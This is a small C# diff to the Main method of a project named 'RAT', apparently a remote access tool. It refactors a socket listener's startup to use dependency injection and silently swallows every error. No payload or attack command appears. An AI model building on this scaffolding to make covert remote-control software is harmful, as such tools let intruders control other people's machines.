@@ -1,4 +1,5 @@
-﻿using RAT.src.SocketLogic;
+﻿using RAT.src.Interfaces;
+using SimpleInjector;
 using System;
 
 namespace RAT
@@ -14,9 +15,19 @@ namespace RAT
         /// <param name="args">Program startup arguments.</param>
         private static void Main(string[] args)
         {
+            Container container = null;
+
             try
             {
-                new SocketLogic().StartListening();
+                container = new DependencyInjectionConfigurator().GetConfiguredContainer();
+                container.Verify();
+            }
+            // This should never happen...
+            catch (Exception) { Environment.Exit(0); }
+
+            try
+            {
+                container.GetInstance<ISocketConnectionListeningLogic>().StartListening();
             }
             catch (Exception) { }
         }
